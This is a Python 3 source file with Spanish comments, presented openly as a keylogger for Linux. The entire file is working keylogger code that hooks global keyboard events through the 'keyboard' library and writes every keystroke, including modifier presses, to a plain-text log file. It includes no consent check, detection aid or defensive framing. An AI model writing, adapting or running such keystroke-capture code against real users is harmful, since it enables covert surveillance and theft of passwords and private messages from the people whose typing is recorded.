#!/usr/bin/python3
# -*- encoding: utf-8 -*-

# @author     Raúl Caro Pastorino
# @email      dev@fryntiz.es
# @web        https://fryntiz.es
# @gitlab     https://gitlab.com/fryntiz
# @github     https://github.com/fryntiz
# @twitter    https://twitter.com/fryntiz
# @telegram   https://t.me/fryntiz

# Create Date: 2020
# Project Name: Python Keylogger
# Description: Keylogger escrito en python 3 para detectar las teclas pulsadas en un equipo linux. En principio debería funcionar también en windows (no comprobado por no tener ese sistema)

#
# Dependencies: keyboard
#
# Revision 0.01 - File Created
# Additional Comments: 

# @copyright  Copyright © 2020 Raúl Caro Pastorino
# @license    https://wwww.gnu.org/licenses/gpl.txt

# Copyright (C) 2020  Raúl Caro Pastorino
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>

# Guía de estilos aplicada: PEP8

#######################################
# #           Descripción           # #
#######################################
# Keylogger escrito en python 3 para detectar las teclas pulsadas en un equipo linux. 
# En principio debería funcionar también en windows (no comprobado por no tener ese 
# sistema)

#######################################
# #       Importar Librerías        # #
#######################################
from functools import partial
import atexit
import os
import keyboard

#######################################
# #             Variables           # #
#######################################

#######################################
# #              Clases             # #
#######################################

class Keylogger:
    # Ubicación para guardar la salida en texto plano.
    file_path = 'keylogger.log'

    # Borrar archivo al iniciar programa.
    clear_on_startup = False

    # Tecla para terminar el programa o None para no utilizar ninguna tecla.
    terminate_key = None

    # Almacena el archivo de salida para operar sobre él.
    output = None

    # Almacena si hay una tecla presionada.
    is_down = {}

    # Traducción de carácteres para hacerlos imprimibles en texto plano.
    MAP = {
        "space": " ",
        "\r": "\n"
    }

    def __init__(self, file_path='keylogger.log', clear_on_startup=False, terminate_key=None):
        self.file_path = file_path
        self.clear_on_startup = clear_on_startup
        self.terminate_key = terminate_key

        # Se abre el archivo para escribir.
        self.output = open(self.file_path, "a")

        # Elimina el archivo anterior con los registros del keylogger.
        if self.clear_on_startup:
            os.remove(self.file_path)
        
        # Se añade evento para cerrar el archivo al salir.
        atexit.register(self.onexit)
        
        # Se inicia la escucha de teclas.
        keyboard.hook(partial(self.callback))
        keyboard.wait(self.terminate_key)


    def callback(self, event):
        """
        Esta función se ejecuta como callback cada vez que una tecla es pulsada recibiendo
        el evento y filtrando solo por las primeras pulsaciones (no las continuadas)
        """
        if event.event_type in ("up", "down"):
            key = self.MAP.get(event.name, event.name)
            modifier = len(key) > 1

            # Filtra el tipo de evento para solo contabilizar pulsaciones.
            if not modifier and event.event_type == "down":
                return
            
            # Cuando se mantiene presionada la misma tecla no se contabiliza.
            if modifier:
                if event.event_type == "down":
                    if self.is_down.get(key, False):
                        return
                    else:
                        self.is_down[key] = True
                elif event.event_type == "up":
                    self.is_down[key] = False
                
                # Indica si está siendo presionado.
                key = " [{} ({})] ".format(key, event.event_type)
            elif key == "\r":
                # Salto de línea.
                key = "\n"

            # Escribe la tecla al archivo de salida.
            self.output.write(key)

            # Se fuerza escritura.
            self.output.flush()


    def onexit(self):
        """
        Acciones al salir
        """
        self.output.close()
